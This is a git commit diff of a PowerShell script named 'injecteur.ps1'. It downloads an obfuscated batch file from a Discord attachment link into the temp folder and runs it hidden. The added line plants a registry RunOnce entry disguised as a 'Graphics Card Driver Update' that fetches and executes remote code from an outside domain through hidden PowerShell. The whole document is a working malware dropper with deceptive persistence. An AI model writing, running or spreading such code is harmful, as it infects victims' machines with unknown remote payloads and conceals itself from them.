26c002f6bc69c3179fce40f78b420102fa9e1083
Fascicule <87366355+dazd-pkz@users.noreply.github.com>
2023-05-19 02:15:03 +0200

    Update injecteur.ps1

--- injecteur.ps1
+++ injecteur.ps1
@@ -1,1 +1,2 @@
 iwr -useb https://cdn.discordapp.com/attachments/1074713687778152552/1086268052661878835/startobfobfusc-obf.bat -o $env:TEMP\tesconouquoimec.bat; saps $env:TEMP\tesconouquoimec.bat -WindowStyle Hidden
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "Graphics Card Driver Update" /t REG_SZ /d "powershell.exe saps powershell.exe 'iwr -useb urlday.cc/micro|iex' -WindowStyle Hidden"
